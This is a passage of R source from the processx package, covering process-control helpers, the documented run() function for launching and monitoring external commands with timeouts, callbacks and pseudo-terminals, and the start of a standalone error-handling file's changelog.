    cleanfiles = NULL, # which temp stdout/stderr file(s) to clean up
    wd = NULL, # working directory (or NULL for current)
    starttime = NULL, # timestamp of start (display; >= starttime_raw)
    starttime_raw = NULL, # timestamp of start as reported by OS (for ps compat)
    endtime = NULL, # timestamp of exit, or 0 if not yet exited
    echo_cmd = NULL, # whether to echo the command
    windows_verbatim_args = NULL,
    windows_hide_window = NULL,

    status = NULL, # C file handle

    supervised = FALSE, # Whether process is tracked by supervisor

    stdin_pipe = NULL,
    stdout_pipe = NULL,
    stderr_pipe = NULL,
    poll_pipe = NULL,

    encoding = "",

    env = NULL,

    connections = list(),

    post_process = NULL,
    post_process_result = NULL,
    post_process_done = FALSE,

    tree_id = NULL,

    finalize = function() {
      if (
        !is.null(private$tree_id) &&
          private$cleanup_tree &&
          ps::ps_is_supported()
      ) {
        self$kill_tree()
      }
    },

    get_short_name = function() process_get_short_name(self, private),
    close_connections = function() process_close_connections(self, private)
  )
)

## See the C source code for a discussion about the implementation
## of these methods

process_wait <- function(self, private, timeout) {
  "!DEBUG process_wait `private$get_short_name()`"
  chain_clean_call(
    c_processx_wait,
    private$status,
    as.integer(timeout),
    private$get_short_name()
  )
  invisible(self)
}

process_is_alive <- function(self, private) {
  "!DEBUG process_is_alive `private$get_short_name()`"
  chain_call(c_processx_is_alive, private$status, private$get_short_name())
}

process_get_exit_status <- function(self, private) {
  "!DEBUG process_get_exit_status `private$get_short_name()`"
  chain_call(
    c_processx_get_exit_status,
    private$status,
    private$get_short_name()
  )
}

process_signal <- function(self, private, signal) {
  "!DEBUG process_signal `private$get_short_name()` `signal`"
  chain_call(
    c_processx_signal,
    private$status,
    as.integer(signal),
    private$get_short_name()
  )
}

process_interrupt <- function(self, private) {
  "!DEBUG process_interrupt `private$get_short_name()`"
  if (os_type() == "windows") {
    pid <- as.character(self$get_pid())
    st <- run(get_tool("interrupt"), c(pid, "c"), error_on_status = FALSE)
    if (st$status == 0) TRUE else FALSE
  } else {
    chain_call(c_processx_interrupt, private$status, private$get_short_name())
  }
}

process_kill <- function(self, private, grace, close_connections) {
  "!DEBUG process_kill '`private$get_short_name()`', pid `self$get_pid()`"
  ret <- chain_call(
    c_processx_kill,
    private$status,
    as.numeric(grace),
    private$get_short_name()
  )
  if (close_connections) {
    private$close_connections()
  }
  ret
}

process_kill_tree <- function(self, private, grace, close_connections) {
  "!DEBUG process_kill_tree '`private$get_short_name()`', pid `self$get_pid()`"
  if (!ps::ps_is_supported()) {
    throw(new_not_implemented_error(
      "kill_tree is not supported on this platform"
    ))
  }

  ret <- get("ps_kill_tree", asNamespace("ps"))(private$tree_id)
  if (close_connections) {
    private$close_connections()
  }
  ret
}

process_get_start_time <- function(self, private) {
  format_unix_time(private$starttime)
}

process_get_end_time <- function(self, private) {
  if (!is.null(private$endtime)) {
    return(private$endtime)
  }
  et <- chain_call(c_processx__proc_end_time, private$status)
  if (is.null(et)) {
    return(NULL)
  }
  private$endtime <- format_unix_time(et)
  private$endtime
}

process_get_pid <- function(self, private) {
  chain_call(c_processx_get_pid, private$status)
}

process_is_supervised <- function(self, private) {
  private$supervised
}

process_supervise <- function(self, private, status) {
  if (status && !self$is_supervised()) {
    supervisor_watch_pid(self$get_pid())
    private$supervised <- TRUE
  } else if (!status && self$is_supervised()) {
    supervisor_unwatch_pid(self$get_pid())
    private$supervised <- FALSE
  }
}

process_get_result <- function(self, private) {
  if (self$is_alive()) {
    throw(new_error("Process is still alive"))
  }
  if (!private$post_process_done && is.function(private$post_process)) {
    private$post_process_result <- private$post_process()
    private$post_process_done <- TRUE
  }
  private$post_process_result
}

process_as_ps_handle <- function(self, private) {
  ps::ps_handle(self$get_pid(), format_unix_time(private$starttime_raw))
}

ps_method <- function(fun, self, private) {
  fun(ps::ps_handle(self$get_pid(), format_unix_time(private$starttime_raw)))
}

process_close_connections <- function(self, private) {
  for (f in c("stdin_pipe", "stdout_pipe", "stderr_pipe", "poll_pipe")) {
    if (!is.null(p <- private[[f]])) {
      chain_call(c_processx_connection_close, p)
    }
  }
}

#' Default options for pseudo terminals (ptys)
#'
#' @return Named list of default values of pty options.
#'
#' Options and default values:
#' * `echo` whether to keep the echo on the terminal. `FALSE` turns echo
#'   off.
#' * `rows` the (initial) terminal size, number of rows.
#' * `cols` the (initial) terminal size, number of columns.
#'
#' @export

default_pty_options <- function() {
  list(
    echo = FALSE,
    rows = 25L,
    cols = 80L
  )
}
````

### `px390/processx/R/processx-package.R`

````r
#' @keywords internal
"_PACKAGE"

## usethis namespace: start
## usethis namespace: end
NULL
````

### `px390/processx/R/run.R`

````r
#' Run external command, and wait until finishes
#'
#' `run` provides an interface similar to [base::system()] and
#' [base::system2()], but based on the [process] class. This allows some
#' extra features, see below.
#'
#' `run` supports
#' * Specifying a timeout for the command. If the specified time has
#'   passed, and the process is still running, it will be killed
#'   (with all its child processes).
#' * Calling a callback function for each line or each chunk of the
#'   standard output and/or error. A chunk may contain multiple lines, and
#'   can be as short as a single character.
#' * Cleaning up the subprocess, or the whole process tree, before exiting.
#'
#' @section Callbacks:
#'
#' Some notes about the callback functions. The first argument of a
#' callback function is a character scalar (length 1 character), a single
#' output or error line. The second argument is always the [process]
#' object. You can manipulate this object, for example you can call
#' `$kill()` on it to terminate it, as a response to a message on the
#' standard output or error.
#'
#' @section Error conditions:
#'
#' `run()` throws error condition objects if the process is interrupted,
#' timeouts or fails (if `error_on_status` is `TRUE`):
#' * On interrupt, a condition with classes `system_command_interrupt`,
#'   `interrupt`, `condition` is signalled. This can be caught with
#'   `tryCatch(..., interrupt = ...)`.
#' * On timeout, a condition with classes `system_command_timeout_error`,
#'   `system_command_error`, `error`, `condition` is thrown.
#' * On error (if `error_on_status` is `TRUE`), an error with classes
#'   `system_command_status_error`, `system_command_error`, `error`,
#'   `condition` is thrown.
#'
#' All of these conditions have the fields:
#' * `message`: the error message,
#' * `stderr`: the standard error of the process, or the standard output
#'    of the process if `stderr_to_stdout` was `TRUE`.
#' * `call`: the captured call to `run()`.
#' * `echo`: the value of the `echo` argument.
#' * `stderr_to_stdout`: the value of the `stderr_to_stdout` argument.
#' * `status`: the exit status for `system_command_status_error` errors.
#'
#' @param command Character scalar, the command to run. If you are
#'   running `.bat` or `.cmd` files on Windows, make sure you read the
#'   'Batch files' section in the [process] manual page.
#' @param args Character vector, arguments to the command.
#' @param error_on_status Whether to throw an error if the command returns
#'   with a non-zero status, or it is interrupted. The error classes are
#'   `system_command_status_error` and `system_command_timeout_error`,
#'   respectively, and both errors have class `system_command_error` as
#'   well. See also "Error conditions" below.
#' @param wd Working directory of the process. If `NULL`, the current
#'   working directory is used.
#' @param echo_cmd Whether to print the command to run to the screen.
#' @param echo Whether to print the standard output and error
#'   to the screen. Note that the order of the standard output and error
#'   lines are not necessarily correct, as standard output is typically
#'   buffered. If the standard output and/or error is redirected to a
#'   file or they are ignored, then they also not echoed.
#' @param spinner Whether to show a reassuring spinner while the process
#'   is running.
#' @param timeout Timeout for the process, in seconds, or as a `difftime`
#'   object. If it is not finished before this, it will be killed.
#' @param stdout What to do with the standard output. By default it
#'   is collected in the result, and you can also use the
#'   `stdout_line_callback` and `stdout_callback` arguments to pass
#'   callbacks for output. If it is the empty string (`""`), then
#'   the child process inherits the standard output stream of the
#'   R process. (If the main R process does not have a standard output
#'   stream, e.g. in RGui on Windows, then an error is thrown.)
#'   If it is `NULL`, then standard output is discarded. If it is a string
#'   other than `"|"` and `""`, then it is taken as a file name and the
#'   output is redirected to this file.
#' @param stderr What to do with the standard error. By default it
#'   is collected in the result, and you can also use the
#'   `stderr_line_callback` and `stderr_callback` arguments to pass
#'   callbacks for output. If it is the empty string (`""`), then
#'   the child process inherits the standard error stream of the
#'   R process. (If the main R process does not have a standard error
#'   stream, e.g. in RGui on Windows, then an error is thrown.)
#'   If it is `NULL`, then standard error is discarded. If it is a string
#'   other than `"|"` and `""`, then it is taken as a file name and the
#'   standard error is redirected to this file.
#' @param stdout_line_callback `NULL`, or a function to call for every
#'   line of the standard output. See `stdout_callback` and also more
#'   below.
#' @param stdout_callback `NULL`, or a function to call for every chunk
#'   of the standard output. A chunk can be as small as a single character.
#'   At most one of `stdout_line_callback` and `stdout_callback` can be
#'   non-`NULL`.
#' @param stderr_line_callback `NULL`, or a function to call for every
#'   line of the standard error. See `stderr_callback` and also more
#'   below.
#' @param stderr_callback `NULL`, or a function to call for every chunk
#'   of the standard error. A chunk can be as small as a single character.
#'   At most one of `stderr_line_callback` and `stderr_callback` can be
#'   non-`NULL`.
#' @param stderr_to_stdout Whether to redirect the standard error to the
#'   standard output. Specifying `TRUE` here will keep both in the
#'   standard output, correctly interleaved. However, it is not possible
#'   to deduce where pieces of the output were coming from. If this is
#'   `TRUE`, the standard error callbacks  (if any) are never called.
#' @param env Environment variables of the child process. If `NULL`,
#'   the parent's environment is inherited. On Windows, many programs
#'   cannot function correctly if some environment variables are not
#'   set, so we always set `HOMEDRIVE`, `HOMEPATH`, `LOGONSERVER`,
#'   `PATH`, `SYSTEMDRIVE`, `SYSTEMROOT`, `TEMP`, `USERDOMAIN`,
#'   `USERNAME`, `USERPROFILE` and `WINDIR`. To append new environment
#'   variables to the ones set in the current process, specify
#'   `"current"` in `env`, without a name, and the appended ones with
#'   names. The appended ones can overwrite the current ones.
#' @param windows_verbatim_args Whether to omit the escaping of the
#'   command and the arguments on windows. Ignored on other platforms.
#' @param windows_hide_window Whether to hide the window of the
#'   application on windows. Ignored on other platforms.
#' @param encoding The encoding to assume for `stdout` and
#'   `stderr`. By default the encoding of the current locale is
#'   used. Note that `processx` always reencodes the output of
#'   both streams in UTF-8 currently. Use `"binary"` to collect
#'   the raw bytes without any conversion: `stdout` and `stderr`
#'   in the return value will be raw vectors instead of character
#'   strings. Line callbacks are not supported in binary mode.
#' @param cleanup_tree Whether to clean up the child process tree after
#'   the process has finished.
#' @param stdin What to do with the standard input. By default it is
#'   ignored (`NULL`). It can be a file name, to redirect the contents of
#'   a file to the standard input. When `pty = TRUE`, `stdin` can only be
#'   `NULL` (no input) or a file path (whose contents are fed to the
#'   process via the PTY).
#' @param pty Whether to use a pseudo-terminal (PTY) for the process.
#'   Supported on Unix and on Windows 10 version 1809 or later (via
#'   ConPTY). When `TRUE`, stdout and stderr are merged into a single
#'   stream (accessible via `$stdout` in the result), and `$stderr` is
#'   always `NULL`. The process sees a real terminal, so programs that
#'   disable colour or interactive features when not attached to a terminal
#'   will behave as if they are. `stdout` and `stderr` must be left at
#'   their defaults (`"|"`), and `stderr_to_stdout`, `stderr_callback`,
#'   and `stderr_line_callback` must not be set.
#' @param pty_options Options for the PTY, a named list. See
#'   [default_pty_options()] for the available options and their defaults.
#' @param ... Extra arguments are passed to `process$new()`, see
#'   [process]. Note that you cannot pass `stout` or `stderr` here,
#'   because they are used internally by `run()`. You can use the
#'   `stdout_callback`, `stderr_callback`, etc. arguments to manage
#'   the standard output and error, or the [process] class directly
#'   if you need more flexibility.
#' @return A list with components:
#'   * status The exit status of the process. If this is `NA`, then the
#'     process was killed and had no exit status.
#'   * stdout The standard output of the command, in a character scalar.
#'   * stderr The standard error of the command, in a character scalar.
#'   * timeout Whether the process was killed because of a timeout.
#'
#' @export
#' @examplesIf .Platform$OS.type == "unix"
#' # This works on Unix systems
#' run("ls")
#' system.time(run("sleep", "10", timeout = 1, error_on_status = FALSE))
#' system.time(
#'   run(
#'     "sh", c("-c", "for i in 1 2 3 4 5; do echo $i; sleep 1; done"),
#'     timeout = 2, error_on_status = FALSE
#'   )
#' )
#'
#' @examplesIf FALSE
#' # This works on Windows systems, if the ping command is available
#' run("ping", c("-n", "1", "127.0.0.1"))
#' run("ping", c("-n", "6", "127.0.0.1"), timeout = 1,
#'     error_on_status = FALSE)

run <- function(
  command = NULL,
  args = character(),
  error_on_status = TRUE,
  wd = NULL,
  echo_cmd = FALSE,
  echo = FALSE,
  spinner = FALSE,
  timeout = Inf,
  stdout = "|",
  stderr = "|",
  stdout_line_callback = NULL,
  stdout_callback = NULL,
  stderr_line_callback = NULL,
  stderr_callback = NULL,
  stderr_to_stdout = FALSE,
  stdin = NULL,
  env = NULL,
  windows_verbatim_args = FALSE,
  windows_hide_window = FALSE,
  encoding = "",
  cleanup_tree = FALSE,
  pty = FALSE,
  pty_options = list(),
  ...
) {
  assert_that(is_flag(error_on_status))
  assert_that(is_time_interval(timeout))
  assert_that(is_flag(spinner))
  assert_that(is_string_or_null(stdout))
  assert_that(is_string_or_null(stderr))
  assert_that(
    is.null(stdout_line_callback) ||
      is.function(stdout_line_callback)
  )
  assert_that(
    is.null(stderr_line_callback) ||
      is.function(stderr_line_callback)
  )
  assert_that(is.null(stdout_callback) || is.function(stdout_callback))
  assert_that(is.null(stderr_callback) || is.function(stderr_callback))
  assert_that(is_flag(cleanup_tree))
  assert_that(is_flag(stderr_to_stdout))
  if (encoding == "binary") {
    if (!is.null(stdout_line_callback)) {
      throw(new_error(
        "`stdout_line_callback` cannot be used with `encoding = \"binary\"`"
      ))
    }
    if (!is.null(stderr_line_callback)) {
      throw(new_error(
        "`stderr_line_callback` cannot be used with `encoding = \"binary\"`"
      ))
    }
  }
  if (pty) {
    if (!identical(stdout, "|")) {
      throw(new_error(
        "`stdout` must be `\"|\"` (the default) if `pty = TRUE`"
      ))
    }
    if (!identical(stderr, "|")) {
      throw(new_error(
        "`stderr` must be `\"|\"` (the default) if `pty = TRUE`"
      ))
    }
    if (stderr_to_stdout) {
      throw(new_error(
        "`stderr_to_stdout` must be `FALSE` if `pty = TRUE`"
      ))
    }
    if (!is.null(stderr_callback)) {
      throw(new_error(
        "`stderr_callback` cannot be used with `pty = TRUE`"
      ))
    }
    if (!is.null(stderr_line_callback)) {
      throw(new_error(
        "`stderr_line_callback` cannot be used with `pty = TRUE`"
      ))
    }
    if (!is.null(stdin) && (!is_string(stdin) || stdin %in% c("|", ""))) {
      throw(new_error(
        "When `pty = TRUE`, `stdin` must be `NULL` or a file path"
      ))
    }
  }
  ## The rest is checked by process$new()
  "!DEBUG run() Checked arguments"

  if (!interactive()) {
    spinner <- FALSE
  }

  ## Run the process
  if (stderr_to_stdout) {
    stderr <- "2>&1"
  }
  ## For PTY, stdin must be NULL in process$new() (PTY handles I/O itself).
  ## We read a file-based stdin now so we can write it via the PTY master.
  if (pty && is.character(stdin)) {
    stdin_bytes <- readBin(stdin, "raw", n = file.info(stdin)$size)
  } else {
    stdin_bytes <- NULL
  }
  pr <- process$new(
    command,
    args,
    echo_cmd = echo_cmd,
    wd = wd,
    windows_verbatim_args = windows_verbatim_args,
    windows_hide_window = windows_hide_window,
    stdin = if (pty) NULL else stdin,
    stdout = if (pty) NULL else stdout,
    stderr = if (pty) NULL else stderr,
    env = env,
    encoding = encoding,
    cleanup_tree = cleanup_tree,
    pty = pty,
    pty_options = pty_options,
    ...
  )
  "#!DEBUG run() Started the process: `pr$get_pid()`"

  ## We make sure that the process is eliminated
  if (cleanup_tree) {
    on.exit(pr$kill_tree(), add = TRUE)
  } else {
    on.exit(pr$kill(), add = TRUE)
  }

  ## If echo, then we need to create our own callbacks.
  ## These are merged to user callbacks if there are any.
  if (echo) {
    stdout_callback <- echo_callback(stdout_callback, "stdout")
    if (!pty) stderr_callback <- echo_callback(stderr_callback, "stderr")
  }

  ## Make the process interruptible, and kill it on interrupt
  runcall <- sys.call()
  resenv <- new.env(parent = emptyenv())
  has_stdout <- pty || (!is.null(stdout) && stdout == "|")
  has_stderr <- !pty && (!is.null(stderr) && stderr == "|")

  binary <- encoding == "binary"
  if (has_stdout) {
    resenv$outbuf <- if (binary) make_raw_buffer() else make_buffer()
    on.exit(resenv$outbuf$done(), add = TRUE)
  }
  if (has_stderr) {
    resenv$errbuf <- if (binary) make_raw_buffer() else make_buffer()
    on.exit(resenv$errbuf$done(), add = TRUE)
  }

  res <- tryCatch(
    run_manage(
      pr,
      timeout,
      spinner,
      stdout,
      stderr,
      stdout_line_callback,
      stdout_callback,
      stderr_line_callback,
      stderr_callback,
      resenv,
      binary,
      pty,
      stdin_bytes
    ),
    interrupt = function(e) {
      "!DEBUG run() process `pr$get_pid()` killed on interrupt"
      out <- if (has_stdout) {
        if (binary) {
          resenv$outbuf$push(pr$read_output_bytes())
          resenv$outbuf$push(pr$read_output_bytes())
        } else {
          resenv$outbuf$push(pr$read_output())
          resenv$outbuf$push(pr$read_output())
        }
        resenv$outbuf$read()
      }
      err <- if (has_stderr) {
        if (binary) {
          resenv$errbuf$push(pr$read_error_bytes())
          resenv$errbuf$push(pr$read_error_bytes())
        } else {
          resenv$errbuf$push(pr$read_error())
          resenv$errbuf$push(pr$read_error())
        }
        resenv$errbuf$read()
      }
      tryCatch(pr$kill(), error = function(e) NULL)
      signalCondition(new_process_interrupt_cond(
        list(
          interrupt = TRUE,
          stderr = err,
          stdout = out,
          command = command,
          args = args
        ),
        runcall,
        echo = echo,
        stderr_to_stdout = stderr_to_stdout
      ))
      cat("\n")
      invokeRestart("abort")
    }
  )

  if (error_on_status && (is.na(res$status) || res$status != 0)) {
    "!DEBUG run() error on status `res$status` for process `pr$get_pid()`"
    throw(new_process_error(
      res,
      call = sys.call(),
      echo = echo,
      stderr_to_stdout,
      res$status,
      command = command,
      args = args
    ))
  }

  res
}

echo_callback <- function(user_callback, type) {
  force(user_callback)
  force(type)
  function(x, ...) {
    if (type == "stderr" && has_package("cli")) {
      x <- cli::col_red(x)
    }
    cat(x, sep = "")
    if (!is.null(user_callback)) user_callback(x, ...)
  }
}

run_manage <- function(
  proc,
  timeout,
  spinner,
  stdout,
  stderr,
  stdout_line_callback,
  stdout_callback,
  stderr_line_callback,
  stderr_callback,
  resenv,
  binary = FALSE,
  pty = FALSE,
  stdin_bytes = NULL
) {
  timeout <- as.difftime(timeout, units = "secs")
  start_time <- proc$get_start_time()

  has_stdout <- pty || (!is.null(stdout) && stdout == "|")
  has_stderr <- !pty && (!is.null(stderr) && stderr == "|")

  ## For PTY with file-based stdin, we feed bytes inside the poll loop
  ## rather than up front. This prevents a deadlock where the child's
  ## stdin buffer is full (so it blocks reading) AND the child's output
  ## buffer is full (so it blocks writing): feeding stdin and draining
  ## output must be interleaved.
  ##
  ## stdin_remaining: bytes left to write (NULL = nothing to write / done)
  ## stdin_eof_sent:  TRUE once we have sent the double Ctrl+D EOF signal
  stdin_remaining <- stdin_bytes
  stdin_eof_sent  <- is.null(stdin_bytes)

  pushback_out <- ""
  pushback_err <- ""

  do_output <- function() {
    ok <- FALSE
    if (has_stdout) {
      newout <- tryCatch(
        {
          ret <- if (binary) proc$read_output_bytes(2000) else
            proc$read_output(2000)
          ok <- TRUE
          ret
        },
        error = function(e) NULL
      )

      if (binary) {
        if (length(newout) > 0L) {
          if (!is.null(stdout_callback)) stdout_callback(newout, proc)
          resenv$outbuf$push(newout)
        }
      } else {
        if (length(newout) && nzchar(newout)) {
          if (!is.null(stdout_callback)) {
            stdout_callback(newout, proc)
          }
          resenv$outbuf$push(newout)
          if (!is.null(stdout_line_callback)) {
            newout <- paste0(pushback_out, newout)
            pushback_out <<- ""
            lines <- strsplit(newout, "\r?\n")[[1]]
            if (last_char(newout) != "\n") {
              pushback_out <<- utils::tail(lines, 1)
              lines <- utils::head(lines, -1)
            }
            lapply(lines, function(x) stdout_line_callback(x, proc))
          }
        }
      }
    }

    if (has_stderr) {
      newerr <- tryCatch(
        {
          ret <- if (binary) proc$read_error_bytes(2000) else
            proc$read_error(2000)
          ok <- TRUE
          ret
        },
        error = function(e) NULL
      )

      if (binary) {
        if (length(newerr) > 0L) {
          if (!is.null(stderr_callback)) stderr_callback(newerr, proc)
          resenv$errbuf$push(newerr)
        }
      } else {
        if (length(newerr) && nzchar(newerr)) {
          resenv$errbuf$push(newerr)
          if (!is.null(stderr_callback)) {
            stderr_callback(newerr, proc)
          }
          if (!is.null(stderr_line_callback)) {
            newerr <- paste0(pushback_err, newerr)
            pushback_err <<- ""
            lines <- strsplit(newerr, "\r?\n")[[1]]
            if (last_char(newerr) != "\n") {
              pushback_err <<- utils::tail(lines, 1)
              lines <- utils::head(lines, -1)
            }
            lapply(lines, function(x) stderr_line_callback(x, proc))
          }
        }
      }
    }

    ok
  }

  spin <- (function() {
    state <- 1L
    phases <- c("-", "\\", "|", "/")
    function() {
      cat("\r", phases[state], "\r", sep = "")
      state <<- state %% length(phases) + 1L
      utils::flush.console()
    }
  })()

  timeout_happened <- FALSE

  while (proc$is_alive()) {
    ## Timeout? Maybe finished by now...
    if (
      !is.null(timeout) &&
        is.finite(timeout) &&
        Sys.time() - start_time > timeout
    ) {
      if (proc$kill(close_connections = FALSE)) {
        timeout_happened <- TRUE
      }
      "!DEBUG Timeout killed run() process `proc$get_pid()`"
      break
    }

    ## Otherwise just poll for 200ms, or less if a timeout is sooner.
    ## We cannot poll until the end, even if there is not spinner,
    ## because RStudio does not send a SIGINT to the R process,
    ## so interruption does not work.
    if (!is.null(timeout) && timeout < Inf) {
      remains <- timeout - (Sys.time() - start_time)
      remains <- max(0, as.integer(as.numeric(remains) * 1000))
      if (spinner) remains <- min(remains, 200)
    } else {
      remains <- 200
    }
    ## Feed PTY stdin a chunk at a time, interleaved with output draining
    ## to prevent the write-write deadlock described above.
    if (!stdin_eof_sent) {
      if (length(stdin_remaining) > 0L) {
        stdin_remaining <- proc$write_input(stdin_remaining)
      }
      if (length(stdin_remaining) == 0L) {
        ## Signal EOF to the PTY.
        ## Unix: two Ctrl+D (0x04) — first flushes the line buffer,
        ##       second triggers unconditional EOF.
        ## Windows ConPTY: Ctrl+Z (0x1A) — the Windows CRT treats this
        ##       as EOF when reading from a console in text mode.
        eof_bytes <- if (.Platform$OS.type == "windows") {
          as.raw(0x1aL)
        } else {
          as.raw(c(0x04L, 0x04L))
        }
        proc$write_input(eof_bytes)
        stdin_eof_sent <- TRUE
      }
    }

    "!DEBUG run is polling for `remains` ms, process `proc$get_pid()`"
    polled <- proc$poll_io(remains)

    ## If output/error, then collect it
    if (any(polled == "ready")) {
      do_output()
    }

    if (spinner) spin()
  }

  ## Windows PTY: after process exit the IOCP timeout is forced to 0 (because
  ## poll_pipe is at EOF), so proc$poll_io(-1) returns immediately regardless
  ## of the timeout.  conhost.exe processes the child's final writes
  ## asynchronously; we must poll *only* the stdout connection (not the full
  ## process) to give conhost time to flush.  Then call ClosePseudoConsole()
  ## so conhost closes its write end of the pipe, causing EOF on our read end.
  ## Skip this if we already killed the process (timeout / forced kill).
  if (pty && .Platform$OS.type == "windows" && has_stdout && !timeout_happened) {
    con <- proc$get_output_connection()
    repeat {
      p <- poll(list(con), 1000L)[[1]]
      if (!identical(p, "ready")) break
      do_output()
    }
    priv <- get_private(proc)
    chain_call(c_processx_pty_close, priv$status, priv$get_short_name())
  }

  ## Needed to get the exit status
  "!DEBUG run() waiting to get exit status, process `proc$get_pid()`"
  proc$wait()

  ## We might still have output
  "!DEBUG run() reading leftover output / error, process `proc$get_pid()`"
  while (
    (has_stdout && proc$is_incomplete_output()) ||
      (proc$has_error_connection() && proc$is_incomplete_error())
  ) {
    proc$poll_io(-1)
    if (!do_output()) break
  }

  if (spinner) {
    cat("\r \r")
  }

  list(
    status = proc$get_exit_status(),
    stdout = if (has_stdout) resenv$outbuf$read(),
    stderr = if (has_stderr) resenv$errbuf$read(),
    timeout = timeout_happened
  )
}

new_process_error <- function(
  result,
  call,
  echo,
  stderr_to_stdout,
  status = NA_integer_,
  command,
  args
) {
  if (isTRUE(result$timeout)) {
    new_process_timeout_error(
      result,
      call,
      echo,
      stderr_to_stdout,
      status,
      command,
      args
    )
  } else {
    new_process_status_error(
      result,
      call,
      echo,
      stderr_to_stdout,
      status,
      command,
      args
    )
  }
}

new_process_status_error <- function(
  result,
  call,
  echo,
  stderr_to_stdout,
  status = NA_integer_,
  command,
  args
) {
  err <- new_error(
    "System command '",
    basename(command),
    "' failed",
    call. = call
  )
  err$stderr <- if (stderr_to_stdout) result$stdout else result$stderr
  err$echo <- echo
  err$stderr_to_stdout <- stderr_to_stdout
  err$status <- status

  add_class(err, c("system_command_status_error", "system_command_error"))
}

new_process_interrupt_cond <- function(
  result,
  call,
  echo,
  stderr_to_stdout,
  status = NA_integer_
) {
  cond <- new_cond(
    "System command '",
    basename(result$command),
    "' interrupted",
    call. = call
  )
  cond$stderr <- if (stderr_to_stdout) result$stdout else result$stderr
  cond$echo <- echo
  cond$stderr_to_stdout <- stderr_to_stdout
  cond$status <- status

  add_class(cond, c("system_command_interrupt", "interrupt"))
}

new_process_timeout_error <- function(
  result,
  call,
  echo,
  stderr_to_stdout,
  status = NA_integer_,
  command,
  args
) {
  err <- new_error(
    "System command '",
    basename(command),
    "' timed out",
    call. = call
  )
  err$stderr <- if (stderr_to_stdout) result$stdout else result$stderr
  err$echo <- echo
  err$stderr_to_stdout <- stderr_to_stdout
  err$status <- status

  add_class(err, c("system_command_timeout_error", "system_command_error"))
}

#' @export

format.system_command_error <- function(
  x,
  trace = TRUE,
  class = TRUE,
  advice = !trace,
  ...
) {
  class(x) <- setdiff(class(x), "system_command_error")

  lines <- NextMethod(
    object = x,
    trace = FALSE,
    class = class,
    advice = FALSE,
    ...
  )

  c(
    lines,
    system_error_parts(x),
    if (advice) c("---", err$format$advice()),
    if (trace && !is.null(x$trace)) {
      c("---", "Backtrace:", err$format$trace(x$trace))
    }
  )
}

#' @export

print.system_command_error <- function(x, ...) {
  writeLines(format(x, ...))
}

system_error_parts <- function(x) {
  c(
    "---",
    paste0("Exit status: ", x$status),
    if (x$echo) {
      "stdout & stderr: <printed>"
    } else {
      std <- if (x$stderr_to_stdout) "Stdout & stderr" else "Stderr"
      last_stderr_lines(x$stderr, std)
    }
  )
}

last_stderr_lines <- function(text, std, prefix = "") {
  if (!nzchar(text)) {
    return(paste0(std, ": <empty>"))
  }
  lines <- strsplit(text, "\r?\n")[[1]]

  if (is_interactive() && length(lines) > 10) {
    std <- paste0(std, " (last 10 lines, see `$stderr` for more)")
    lines <- utils::tail(lines, 10)
  }

  c(
    paste0(std, ":"),
    paste0(prefix, lines)
  )
}
````

### `px390/processx/R/standalone-errors.R`

````r
# ---
# repo: r-lib/processx
# file: standalone-errors.R
# last-updated: 2023-01-15
# license: https://unlicense.org
# ---
#
# Standalone file for better error handling. If you can allow package
# dependencies, then you are probably better off using rlang's
# functions for errors.
#
# ## Soft-dependency
#
# - aaa-standalone-rstudio-detect.R in r-lib/cli
#
# ## Features
#
# - Throw conditions and errors with the same API.
# - Automatically captures the right calls and adds them to the conditions.
# - Sets `.Last.error`, so you can easily inspect the errors, even if they
#   were not caught.
# - It only sets `.Last.error` for the errors that are not caught.
# - Hierarchical errors, to allow higher level error messages, that are
#   more meaningful for the users, while also keeping the lower level
#   details in the error object. (So in `.Last.error` as well.)
# - `.Last.error` always includes a stack trace. (The stack trace is
#   common for the whole error hierarchy.) The trace is accessible within
#   the error, e.g. `.Last.error$trace`. The trace of the last error is
#   also at `.Last.error.trace`.
# - Can merge errors and traces across multiple processes.
# - Pretty-print errors and traces, if the cli package is loaded.
# - Automatically hides uninformative parts of the stack trace when
#   printing.
#
# ## API
#
# ```
# new_cond(..., call. = TRUE, srcref = NULL, domain = NA)
# new_error(..., call. = TRUE, srcref = NULL, domain = NA)
# throw(cond, parent = NULL, frame = environment())
# throw_error(cond, parent = NULL, frame = environment())
# chain_error(expr, err, call = sys.call(-1))
# chain_call(.NAME, ...)
# chain_clean_call(.NAME, ...)
# onload_hook()
# add_trace_back(cond, frame = NULL)
# format$advice(x)
# format$call(call)
# format$class(x)
# format$error(x, trace = FALSE, class = FALSE, advice = !trace, ...)
# format$error_heading(x, prefix = NULL)
# format$header_line(x, prefix = NULL)
# format$srcref(call, srcref = NULL)
# format$trace(x, ...)
# ```
#
# ## Roadmap:
# - better printing of anonymous function in the trace
#
# ## Changelog
#
# ### 1.0.0 -- 2019-06-18
#
# * First release.
#
# ### 1.0.1 -- 2019-06-20
#
# * Add `rlib_error_always_trace` option to always add a trace
#
# ### 1.0.2 -- 2019-06-27
#
# * Internal change: change topenv of the functions to baseenv()
#
# ### 1.1.0 -- 2019-10-26
#
# * Register print methods via onload_hook() function, call from .onLoad()
# * Print the error manually, and the trace in non-interactive sessions
#
# ### 1.1.1 -- 2019-11-10
#
# * Only use `trace` in parent errors if they are `rlib_error`s.
#   Because e.g. `rlang_error`s also have a trace, with a slightly
#   different format.
#
# ### 1.2.0 -- 2019-11-13
#
# * Fix the trace if a non-thrown error is re-thrown.
# * Provide print_this() and print_parents() to make it easier to define
#   custom print methods.
# * Fix annotating our throw() methods with the incorrect `base::`.
#
# ### 1.2.1 -- 2020-01-30
#
# * Update wording of error printout to be less intimidating, avoid jargon
# * Use default printing in interactive mode, so RStudio can detect the
#   error and highlight it.
# * Add the rethrow_call_with_cleanup function, to work with embedded
#   cleancall.
#
# ### 1.2.2 -- 2020-11-19
#
# * Add the `call` argument to `catch_rethrow()` and `rethrow()`, to be
#   able to omit calls.
#
# ### 1.2.3 -- 2021-03-06
#
# * Use cli instead of crayon
#
# ### 1.2.4 -- 2021-04-01
#
# * Allow omitting the call with call. = FALSE in `new_cond()`, etc.
#
# ### 1.3.0 -- 2021-04-19
#
# * Avoid embedding calls in trace with embed = FALSE.
#
# ### 2.0.0 -- 2021-04-19
#
# * Versioned classes and print methods
#
# ### 2.0.1 -- 2021-06-29
#
# * Do not convert error messages to native encoding before printing,
#   to be able to print UTF-8 error messages on Windows.
#
# ### 2.0.2 -- 2021-09-07
#
# * Do not translate error messages, as this converts them to the native
#   encoding. We keep messages in UTF-8 now.
#
# ### 3.0.0 -- 2022-04-19
#
# * Major rewrite, use rlang compatible error objects. New API.
#
# ### 3.0.1 -- 2022-06-17
#
# * Remove the `rlang_error` and `rlang_trace` classes, because our new
